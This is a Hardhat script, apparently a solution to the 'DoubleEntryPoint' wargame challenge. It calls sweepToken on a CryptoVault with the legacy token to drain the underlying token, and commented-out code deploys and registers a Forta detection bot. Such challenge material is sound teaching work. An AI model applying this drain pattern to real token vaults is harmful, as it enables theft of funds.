const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0x9B538C1F8A914C0b2f636ceBC36907ac4B83d830";
  const DoubleEntryPointContract = await ethers.getContractFactory(
    "DoubleEntryPoint"
  );
  const DoubleEntryPoint = DoubleEntryPointContract.attach(Instance);

  //Removing Tokens
  // const cryptoVault = await DoubleEntryPoint.cryptoVault();
  // console.log(cryptoVault);
  const cryptoVault = "0xE2203Eaab337Ef017DdF0b0E30513c39c2D339eb";
  // const balance = await DoubleEntryPoint.balanceOf(cryptoVault);
  // const balance = ethers.utils.parseEther("100");
  // console.log(balance, "balance");
  // const legacyToken = await DoubleEntryPoint.delegatedFrom();
  // console.log(legacyToken);
  // const legacyToken = "0xA6f831008CC723Cae0Eb99b7f18b583c45DdD9Aa";

  // let ABI = ["function sweepToken(address token)"];
  // let iface = new ethers.utils.Interface(ABI);
  // const data = iface.encodeFunctionData("sweepToken", [legacyToken]);
  // const result = await owner.sendTransaction({
  //   from: owner.address,
  //   to: cryptoVault,
  //   data,
  // });
  // await result.wait(1);
  // console.log(result, "result");
  // const updatedBalance = await DoubleEntryPoint.balanceOf(cryptoVault);
  // console.log(updatedBalance);

  //Updating Bot
  // const MyDetectionBotContract = await ethers.getContractFactory(
  //   "MyDetectionBot"
  // );
  // const MyDetectionBot = await MyDetectionBotContract.deploy(cryptoVault);
  // await MyDetectionBot.deployed();
  // console.log(MyDetectionBot.address);
  const FortaDetectionBotAddress = "0xcdb004fC504f2cA3DFCDecDfe304232007AC6ca6";

  // const forta = await DoubleEntryPoint.forta();
  // console.log(forta, "forta");
  // const fortaAddres = "0xAf5F39ddDCBEC02d333Bb89C7E6EDFdc04924D18";

  // let FortaABI = ["function setDetectionBot(address detectionBotAddress)"];
  // let FortaIface = new ethers.utils.Interface(FortaABI);
  // const data = FortaIface.encodeFunctionData("setDetectionBot", [
  //   FortaDetectionBotAddress,
  // ]);
  // console.log(data);
  // const FortaResult = await owner.sendTransaction({
  //   from: owner.address,
  //   to: fortaAddres,
  //   data,
  // });
  // console.log(FortaResult);

  const legacyToken = await DoubleEntryPoint.delegatedFrom();
  // console.log(legacyToken);
  let ABI = ["function sweepToken(address token)"];
  let iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData("sweepToken", [legacyToken]);
  const result = await owner.sendTransaction({
    from: owner.address,
    to: cryptoVault,
    data,
  });
  console.log(result, "result");
  await result.wait(1);
  const updatedBalance = await DoubleEntryPoint.balanceOf(cryptoVault);

  console.log(updatedBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
